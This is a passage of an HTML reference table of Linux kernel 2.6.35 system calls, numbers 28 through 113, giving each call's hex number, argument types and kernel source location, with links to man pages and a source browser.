href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1314">kernel&#x2F;timer.c:1314</a></td></tr><tr><td>28</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fstat.2.html">sys_fstat</a></td><td>0x1c</td><td>unsigned int fd</td><td><a href="http://lxr.free-electrons.com/source/arch/arm/include/asm/stat.h?v=2.6.35#L4">struct __old_kernel_stat __user *statbuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L174">fs&#x2F;stat.c:174</a></td></tr><tr><td>29</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pause.2.html">sys_pause</a></td><td>0x1d</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2700">kernel&#x2F;signal.c:2700</a></td></tr><tr><td>30</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/utime.2.html">sys_utime</a></td><td>0x1e</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/include/linux/utime.h?v=2.6.35#L6">struct utimbuf __user *times</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/utimes.c?v=2.6.35#L27">fs&#x2F;utimes.c:27</a></td></tr><tr><td>31</td><td>not implemented</td><td>0x1f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>32</td><td>not implemented</td><td>0x20</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>33</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/access.2.html">sys_access</a></td><td>0x21</td><td>const char __user *filename</td><td>int mode</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L356">fs&#x2F;open.c:356</a></td></tr><tr><td>34</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/nice.2.html">sys_nice</a></td><td>0x22</td><td>int increment</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4282">kernel&#x2F;sched.c:4282</a></td></tr><tr><td>35</td><td>not implemented</td><td>0x23</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>36</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sync.2.html">sys_sync</a></td><td>0x24</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/sync.c?v=2.6.35#L98">fs&#x2F;sync.c:98</a></td></tr><tr><td>37</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/kill.2.html">sys_kill</a></td><td>0x25</td><td>int pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2317">kernel&#x2F;signal.c:2317</a></td></tr><tr><td>38</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rename.2.html">sys_rename</a></td><td>0x26</td><td>const char __user *oldname</td><td>const char __user *newname</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2765">fs&#x2F;namei.c:2765</a></td></tr><tr><td>39</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mkdir.2.html">sys_mkdir</a></td><td>0x27</td><td>const char __user *pathname</td><td>int mode</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2130">fs&#x2F;namei.c:2130</a></td></tr><tr><td>40</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rmdir.2.html">sys_rmdir</a></td><td>0x28</td><td>const char __user *pathname</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2244">fs&#x2F;namei.c:2244</a></td></tr><tr><td>41</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/dup.2.html">sys_dup</a></td><td>0x29</td><td>unsigned int fildes</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/fcntl.c?v=2.6.35#L131">fs&#x2F;fcntl.c:131</a></td></tr><tr><td>42</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pipe.2.html">sys_pipe</a></td><td>0x2a</td><td>int __user *fildes</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/pipe.c?v=2.6.35#L1117">fs&#x2F;pipe.c:1117</a></td></tr><tr><td>43</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/times.2.html">sys_times</a></td><td>0x2b</td><td>struct tms __user *tbuf</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L896">kernel&#x2F;sys.c:896</a></td></tr><tr><td>44</td><td>not implemented</td><td>0x2c</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>45</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/brk.2.html">sys_brk</a></td><td>0x2d</td><td>unsigned long brk</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=2.6.35#L245">mm&#x2F;mmap.c:245</a></td></tr><tr><td>46</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setgid16.2.html">sys_setgid16</a></td><td>0x2e</td><td>old_gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L51">kernel&#x2F;uid16.c:51</a></td></tr><tr><td>47</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getgid16.2.html">sys_getgid16</a></td><td>0x2f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L222">kernel&#x2F;uid16.c:222</a></td></tr><tr><td>48</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/signal.2.html">sys_signal</a></td><td>0x30</td><td>int sig</td><td>__sighandler_t handler</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2683">kernel&#x2F;signal.c:2683</a></td></tr><tr><td>49</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/geteuid16.2.html">sys_geteuid16</a></td><td>0x31</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L217">kernel&#x2F;uid16.c:217</a></td></tr><tr><td>50</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getegid16.2.html">sys_getegid16</a></td><td>0x32</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L227">kernel&#x2F;uid16.c:227</a></td></tr><tr><td>51</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/acct.2.html">sys_acct</a></td><td>0x33</td><td>const char __user *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/acct.c?v=2.6.35#L274">kernel&#x2F;acct.c:274</a></td></tr><tr><td>52</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/umount.2.html">sys_umount</a></td><td>0x34</td><td>char __user *name</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namespace.c?v=2.6.35#L1132">fs&#x2F;namespace.c:1132</a></td></tr><tr><td>53</td><td>not implemented</td><td>0x35</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>54</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ioctl.2.html">sys_ioctl</a></td><td>0x36</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/ioctl.c?v=2.6.35#L613">fs&#x2F;ioctl.c:613</a></td></tr><tr><td>55</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fcntl.2.html">sys_fcntl</a></td><td>0x37</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/fcntl.c?v=2.6.35#L429">fs&#x2F;fcntl.c:429</a></td></tr><tr><td>56</td><td>not implemented</td><td>0x38</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>57</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setpgid.2.html">sys_setpgid</a></td><td>0x39</td><td>pid_t pid</td><td>pid_t pgid</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L921">kernel&#x2F;sys.c:921</a></td></tr><tr><td>58</td><td>not implemented</td><td>0x3a</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>59</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/olduname.2.html">sys_olduname</a></td><td>0x3b</td><td><a href="http://lxr.free-electrons.com/source/include/linux/utsname.h?v=2.6.35#L6">struct oldold_utsname __user *</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1132">kernel&#x2F;sys.c:1132</a></td></tr><tr><td>60</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/umask.2.html">sys_umask</a></td><td>0x3c</td><td>int mask</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1460">kernel&#x2F;sys.c:1460</a></td></tr><tr><td>61</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/chroot.2.html">sys_chroot</a></td><td>0x3d</td><td>const char __user *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L408">fs&#x2F;open.c:408</a></td></tr><tr><td>62</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ustat.2.html">sys_ustat</a></td><td>0x3e</td><td>unsigned dev</td><td><a href="http://lxr.free-electrons.com/source/include/linux/types.h?v=2.6.35#L200">struct ustat __user *ubuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/statfs.c?v=2.6.35#L175">fs&#x2F;statfs.c:175</a></td></tr><tr><td>63</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/dup2.2.html">sys_dup2</a></td><td>0x3f</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/fcntl.c?v=2.6.35#L116">fs&#x2F;fcntl.c:116</a></td></tr><tr><td>64</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getppid.2.html">sys_getppid</a></td><td>0x40</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1348">kernel&#x2F;timer.c:1348</a></td></tr><tr><td>65</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getpgrp.2.html">sys_getpgrp</a></td><td>0x41</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1020">kernel&#x2F;sys.c:1020</a></td></tr><tr><td>66</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setsid.2.html">sys_setsid</a></td><td>0x42</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1055">kernel&#x2F;sys.c:1055</a></td></tr><tr><td>67</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigaction.2.html">sys_sigaction</a></td><td>0x43</td><td>int sig</td><td><a href="http://lxr.free-electrons.com/source/arch/arm/include/asm/signal.h?v=2.6.35#L117">const struct old_sigaction __user *act</a></td><td><a href="http://lxr.free-electrons.com/source/arch/arm/include/asm/signal.h?v=2.6.35#L117">struct old_sigaction __user *oact</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/arch/mips/kernel/signal.c?v=2.6.35#L300">arch&#x2F;mips&#x2F;kernel&#x2F;signal.c:300</a></td></tr><tr><td>68</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sgetmask.2.html">sys_sgetmask</a></td><td>0x44</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2657">kernel&#x2F;signal.c:2657</a></td></tr><tr><td>69</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ssetmask.2.html">sys_ssetmask</a></td><td>0x45</td><td>int newmask</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2663">kernel&#x2F;signal.c:2663</a></td></tr><tr><td>70</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setreuid16.2.html">sys_setreuid16</a></td><td>0x46</td><td>old_uid_t ruid</td><td>old_uid_t euid</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L59">kernel&#x2F;uid16.c:59</a></td></tr><tr><td>71</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setregid16.2.html">sys_setregid16</a></td><td>0x47</td><td>old_gid_t rgid</td><td>old_gid_t egid</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L43">kernel&#x2F;uid16.c:43</a></td></tr><tr><td>72</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigsuspend.2.html">sys_sigsuspend</a></td><td>0x48</td><td>int history0</td><td>int history1</td><td>old_sigset_t mask</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/arch/s390/kernel/signal.c?v=2.6.35#L58">arch&#x2F;s390&#x2F;kernel&#x2F;signal.c:58</a></td></tr><tr><td>73</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigpending.2.html">sys_sigpending</a></td><td>0x49</td><td>old_sigset_t __user *set</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2562">kernel&#x2F;signal.c:2562</a></td></tr><tr><td>74</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sethostname.2.html">sys_sethostname</a></td><td>0x4a</td><td>char __user *name</td><td>int len</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1165">kernel&#x2F;sys.c:1165</a></td></tr><tr><td>75</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setrlimit.2.html">sys_setrlimit</a></td><td>0x4b</td><td>unsigned int resource</td><td><a href="http://lxr.free-electrons.com/source/include/linux/resource.h?v=2.6.35#L41">struct rlimit __user *rlim</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1275">kernel&#x2F;sys.c:1275</a></td></tr><tr><td>76</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/old_getrlimit.2.html">sys_old_getrlimit</a></td><td>0x4c</td><td>unsigned int resource</td><td><a href="http://lxr.free-electrons.com/source/include/linux/resource.h?v=2.6.35#L41">struct rlimit __user *rlim</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1256">kernel&#x2F;sys.c:1256</a></td></tr><tr><td>77</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getrusage.2.html">sys_getrusage</a></td><td>0x4d</td><td>int who</td><td><a href="http://lxr.free-electrons.com/source/include/linux/resource.h?v=2.6.35#L22">struct rusage __user *ru</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1452">kernel&#x2F;sys.c:1452</a></td></tr><tr><td>78</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/gettimeofday.2.html">sys_gettimeofday</a></td><td>0x4e</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L20">struct timeval __user *tv</a></td><td>struct timezone __user *tz</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/time.c?v=2.6.35#L101">kernel&#x2F;time.c:101</a></td></tr><tr><td>79</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/settimeofday.2.html">sys_settimeofday</a></td><td>0x4f</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L20">struct timeval __user *tv</a></td><td>struct timezone __user *tz</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/time.c?v=2.6.35#L185">kernel&#x2F;time.c:185</a></td></tr><tr><td>80</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getgroups16.2.html">sys_getgroups16</a></td><td>0x50</td><td>int gidsetsize</td><td>old_gid_t __user *grouplist</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L164">kernel&#x2F;uid16.c:164</a></td></tr><tr><td>81</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setgroups16.2.html">sys_setgroups16</a></td><td>0x51</td><td>int gidsetsize</td><td>old_gid_t __user *grouplist</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L187">kernel&#x2F;uid16.c:187</a></td></tr><tr><td>82</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/old_select.2.html">sys_old_select</a></td><td>0x52</td><td><a href="http://lxr.free-electrons.com/source/fs/select.c?v=2.6.35#L695">struct sel_arg_struct __user *arg</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/select.c?v=2.6.35#L701">fs&#x2F;select.c:701</a></td></tr><tr><td>83</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/symlink.2.html">sys_symlink</a></td><td>0x53</td><td>const char __user *old</td><td>const char __user *new</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2419">fs&#x2F;namei.c:2419</a></td></tr><tr><td>84</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lstat.2.html">sys_lstat</a></td><td>0x54</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/arch/arm/include/asm/stat.h?v=2.6.35#L4">struct __old_kernel_stat __user *statbuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L162">fs&#x2F;stat.c:162</a></td></tr><tr><td>85</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/readlink.2.html">sys_readlink</a></td><td>0x55</td><td>const char __user *path</td><td>char __user *buf</td><td>int bufsiz</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L311">fs&#x2F;stat.c:311</a></td></tr><tr><td>86</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/uselib.2.html">sys_uselib</a></td><td>0x56</td><td>const char __user *library</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/exec.c?v=2.6.35#L107">fs&#x2F;exec.c:107</a></td></tr><tr><td>87</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/swapon.2.html">sys_swapon</a></td><td>0x57</td><td>const char __user *specialfile</td><td>int swap_flags</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/swapfile.c?v=2.6.35#L1793">mm&#x2F;swapfile.c:1793</a></td></tr><tr><td>88</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/reboot.2.html">sys_reboot</a></td><td>0x58</td><td>int magic1</td><td>int magic2</td><td>unsigned int cmd</td><td>void __user *arg</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L368">kernel&#x2F;sys.c:368</a></td></tr><tr><td>89</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/old_readdir.2.html">sys_old_readdir</a></td><td>0x59</td><td>unsigned int</td><td><a href="http://lxr.free-electrons.com/source/fs/readdir.c?v=2.6.35#L61">struct old_linux_dirent __user *</a></td><td>unsigned int</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/readdir.c?v=2.6.35#L105">fs&#x2F;readdir.c:105</a></td></tr><tr><td>90</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/old_mmap.2.html">sys_old_mmap</a></td><td>0x5a</td><td><a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=2.6.35#L1132">struct mmap_arg_struct __user *arg</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=2.6.35#L1141">mm&#x2F;mmap.c:1141</a></td></tr><tr><td>91</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/munmap.2.html">sys_munmap</a></td><td>0x5b</td><td>unsigned long addr</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=2.6.35#L2109">mm&#x2F;mmap.c:2109</a></td></tr><tr><td>92</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/truncate.2.html">sys_truncate</a></td><td>0x5c</td><td>const char __user *path</td><td>long length</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L127">fs&#x2F;open.c:127</a></td></tr><tr><td>93</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ftruncate.2.html">sys_ftruncate</a></td><td>0x5d</td><td>unsigned int fd</td><td>unsigned long length</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L178">fs&#x2F;open.c:178</a></td></tr><tr><td>94</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchmod.2.html">sys_fchmod</a></td><td>0x5e</td><td>unsigned int fd</td><td>mode_t mode</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L436">fs&#x2F;open.c:436</a></td></tr><tr><td>95</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchown16.2.html">sys_fchown16</a></td><td>0x5f</td><td>unsigned int fd</td><td>old_uid_t user</td><td>old_gid_t group</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L35">kernel&#x2F;uid16.c:35</a></td></tr><tr><td>96</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getpriority.2.html">sys_getpriority</a></td><td>0x60</td><td>int which</td><td>int who</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L216">kernel&#x2F;sys.c:216</a></td></tr><tr><td>97</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setpriority.2.html">sys_setpriority</a></td><td>0x61</td><td>int which</td><td>int who</td><td>int niceval</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L149">kernel&#x2F;sys.c:149</a></td></tr><tr><td>98</td><td>not implemented</td><td>0x62</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>99</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/statfs.2.html">sys_statfs</a></td><td>0x63</td><td>const char __user * path</td><td><a href="http://lxr.free-electrons.com/source/arch/mips/include/asm/statfs.h?v=2.6.35#L22">struct statfs __user *buf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/statfs.c?v=2.6.35#L102">fs&#x2F;statfs.c:102</a></td></tr><tr><td>100</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fstatfs.2.html">sys_fstatfs</a></td><td>0x64</td><td>unsigned int fd</td><td><a href="http://lxr.free-electrons.com/source/arch/mips/include/asm/statfs.h?v=2.6.35#L22">struct statfs __user *buf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/statfs.c?v=2.6.35#L136">fs&#x2F;statfs.c:136</a></td></tr><tr><td>101</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ioperm.2.html">sys_ioperm</a></td><td>0x65</td><td>unsigned long</td><td>unsigned long</td><td>int</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L">not found:</a></td></tr><tr><td>102</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/socketcall.2.html">sys_socketcall</a></td><td>0x66</td><td>int call</td><td>unsigned long __user *args</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/net/socket.c?v=2.6.35#L2210">net&#x2F;socket.c:2210</a></td></tr><tr><td>103</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/syslog.2.html">sys_syslog</a></td><td>0x67</td><td>int type</td><td>char __user *buf</td><td>int len</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/printk.c?v=2.6.35#L412">kernel&#x2F;printk.c:412</a></td></tr><tr><td>104</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setitimer.2.html">sys_setitimer</a></td><td>0x68</td><td>int which</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L263">struct itimerval __user *value</a></td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L263">struct itimerval __user *ovalue</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/itimer.c?v=2.6.35#L279">kernel&#x2F;itimer.c:279</a></td></tr><tr><td>105</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getitimer.2.html">sys_getitimer</a></td><td>0x69</td><td>int which</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L263">struct itimerval __user *value</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/itimer.c?v=2.6.35#L103">kernel&#x2F;itimer.c:103</a></td></tr><tr><td>106</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/newstat.2.html">sys_newstat</a></td><td>0x6a</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/stat.h?v=2.6.35#L4">struct stat __user *statbuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L237">fs&#x2F;stat.c:237</a></td></tr><tr><td>107</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/newlstat.2.html">sys_newlstat</a></td><td>0x6b</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/stat.h?v=2.6.35#L4">struct stat __user *statbuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L247">fs&#x2F;stat.c:247</a></td></tr><tr><td>108</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/newfstat.2.html">sys_newfstat</a></td><td>0x6c</td><td>unsigned int fd</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/stat.h?v=2.6.35#L4">struct stat __user *statbuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L273">fs&#x2F;stat.c:273</a></td></tr><tr><td>109</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/uname.2.html">sys_uname</a></td><td>0x6d</td><td><a href="http://lxr.free-electrons.com/source/include/linux/utsname.h?v=2.6.35#L16">struct old_utsname __user *</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1115">kernel&#x2F;sys.c:1115</a></td></tr><tr><td>110</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/iopl.2.html">sys_iopl</a></td><td>0x6e</td><td>unsigned int</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19">struct pt_regs *</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L">not found:</a></td></tr><tr><td>111</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/vhangup.2.html">sys_vhangup</a></td><td>0x6f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L1008">fs&#x2F;open.c:1008</a></td></tr><tr><td>112</td><td>not implemented</td><td>0x70</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>113</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/vm86old.2.html">sys_vm86old</a></td><td>0x71</td><td><a 